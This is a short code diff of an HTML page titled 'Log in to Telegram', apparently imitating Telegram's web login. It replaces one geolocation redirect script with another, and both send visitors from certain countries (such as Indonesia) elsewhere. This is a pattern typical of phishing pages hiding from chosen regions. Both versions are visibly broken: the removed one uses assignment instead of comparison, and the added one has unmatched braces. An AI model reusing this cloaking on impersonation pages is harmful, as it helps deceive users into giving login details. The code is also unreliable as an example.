@@ -23,22 +23,24 @@
     <meta property="twitter:url" content="https://web.telegram.org">
     <title>Log in to Telegram</title>
 </head>
-    <script type="text/javascript">
-
-$.get('https://ipapi.co/country/', function(country){
-console.log(country)
-})
-
-if (country = "ID") {
-  window.location.replace("https://www.youtube.com");
-}
-else if (country = ["FR","IT","DE","CH"]) {
-  window.location.replace("EU.html");
-}
-else {
-  window.location.replace("https://web.facebook.com");
-}
-
+    <script async src="https://get.geojs.io/v1/ip/geo.js"></script>
+<script>
+var cookieSwitch = 'geo-switch'; 
+if(typeof Cookies.get(cookieSwitch) == 'undefined') { // If cookie is not found, then geo-redirect
+  function geoip() {
+   $.ajax({
+        type: 'get',
+        url: 'https://get.geojs.io/v1/ip/country.json',
+        success: function(data) {
+            if (data['country'] == "ID") {
+              window.location = "https://www.example.com/";
+            }
+        }
+    });
+    }
+geoip();
+});
 </script>
 </body>
 </html>
+
